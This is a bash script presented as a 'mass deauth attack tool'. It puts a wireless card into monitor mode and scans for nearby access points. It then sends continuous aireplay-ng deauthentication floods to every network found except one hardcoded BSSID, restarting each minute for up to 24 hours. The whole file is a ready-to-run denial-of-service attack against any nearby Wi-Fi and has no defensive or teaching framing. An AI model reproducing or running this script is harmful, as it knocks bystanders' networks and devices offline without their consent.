#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
RESET='\033[0m'
BOLD='\033[1m'
BLINK='\033[5m'

# Timer function
start_timer() {
    local hours=$1
    local end_time=$(($(date +%s) + hours*3600))
    
    while [ $(date +%s) -lt $end_time ]; do
        local remaining=$((end_time - $(date +%s)))
        local hours_left=$((remaining/3600))
        local mins_left=$(((remaining%3600)/60))
        local secs_left=$((remaining%60))
        echo -ne "\r${YELLOW}Time Remaining: ${hours_left}h ${mins_left}m ${secs_left}s${RESET}"
        sleep 1
    done
}

# Auto restart function with better attack management
auto_restart() {
    SAFE_BSSID="B4:B0:55:38:63:B4"
    while true; do
        echo -e "\n${CYAN}[+] Starting new attack session...${RESET}"
        
        # Kill any existing attack processes
        sudo pkill -f "airodump-ng" 2>/dev/null
        sudo pkill -f "aireplay-ng" 2>/dev/null
        
        # Start monitor mode fresh
        sudo airmon-ng check kill >/dev/null 2>&1
        sudo airmon-ng start wlan0 >/dev/null 2>&1
        
        # Start airodump-ng to scan networks
        sudo airodump-ng wlan0mon &
        AIRODUMP_PID=$!
        sleep 5
        
        # Launch deauth attacks
        echo -e "${RED}[+] Launching deauth attacks...${RESET}"
        sudo xterm -e "airodump-ng wlan0mon | grep -o '[0-9A-F]\{2\}:[0-9A-F]\{2\}:[0-9A-F]\{2\}:[0-9A-F]\{2\}:[0-9A-F]\{2\}:[0-9A-F]\{2\}' | while read bssid; do
            if [ \"\$bssid\" != \"$SAFE_BSSID\" ]; then
                echo \"${RED}[+] Attacking: \$bssid${RESET}\"
                aireplay-ng --deauth 0 -a \$bssid wlan0mon &
            else
                echo \"${GREEN}[*] Skipping protected network: \$bssid${RESET}\"
            fi
        done" &
        
        # Wait for 58 seconds before next round
        sleep 58
    done
}

# Dangerous Banner
clear
echo -e "${RED}${BOLD}"
cat << "EOF"
    █████╗ ██╗     ██╗    ██████╗  ██████╗  ██████╗  █████╗ ██████╗ 
   ██╔══██╗██║     ██║    ██╔══██╗██╔═══██╗██╔════╝ ██╔══██╗██╔══██╗
   ███████║██║     ██║    ██║  ██║██║   ██║██║  ███╗███████║██████╔╝
   ██╔══██║██║     ██║    ██║  ██║██║   ██║██║   ██║██╔══██║██╔══██╗
   ██║  ██║███████╗██║    ██████╔╝╚██████╔╝╚██████╔╝██║  ██║██║  ██║
   ╚═╝  ╚═╝╚══════╝╚═╝    ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
EOF
echo -e "\n${RED}${BLINK}☠️  MASS DEAUTH ATTACK TOOL ☠️${RESET}"
echo -e "${YELLOW}════════════════════════════════════════════════════════════${RESET}\n"

# Show dangerous warning
echo -e "${RED}${BOLD}[!] WARNING: EXTREMELY DANGEROUS TOOL${RESET}"
echo -e "${RED}${BOLD}[!] USE AT YOUR OWN RISK${RESET}\n"

# Ask for duration
echo -e "${YELLOW}${BOLD}[+] Enter attack duration (1-24 hours): ${RESET}"
read hours

if ! [[ "$hours" =~ ^[0-9]+$ ]] || [ "$hours" -lt 1 ] || [ "$hours" -gt 24 ]; then
    echo -e "${RED}${BOLD}[!] Invalid input. Please enter a number between 1 and 24${RESET}"
    exit 1
fi

echo -e "${GREEN}${BOLD}[+] Attack will run for $hours hours${RESET}"
echo -e "${CYAN}${BOLD}[+] Auto-restarting every 1 minute${RESET}\n"

# Safe BSSID display
echo -e "${YELLOW}${BOLD}[*] Protected Network: B4:B0:55:38:63:B4${RESET}\n"

# Start timer in background
start_timer $hours &
TIMER_PID=$!

# Start auto-restart in background
if [ -z "$AUTO_RESTART" ]; then
    export AUTO_RESTART=1
    auto_restart &
    AUTO_RESTART_PID=$!
fi

# Monitor for timer completion
while kill -0 $TIMER_PID 2>/dev/null; do
    sleep 1
done

# Cleanup when timer ends
echo -e "\n${GREEN}[*] Attack duration completed. Cleaning up...${RESET}"
kill $AUTO_RESTART_PID 2>/dev/null
sudo airmon-ng stop wlan0mon >/dev/null 2>&1
sudo pkill -f "airodump-ng"
sudo pkill -f "aireplay-ng"

echo -e "${GREEN}[*] All attacks stopped. WiFi restored to normal.${RESET}"
exit 0
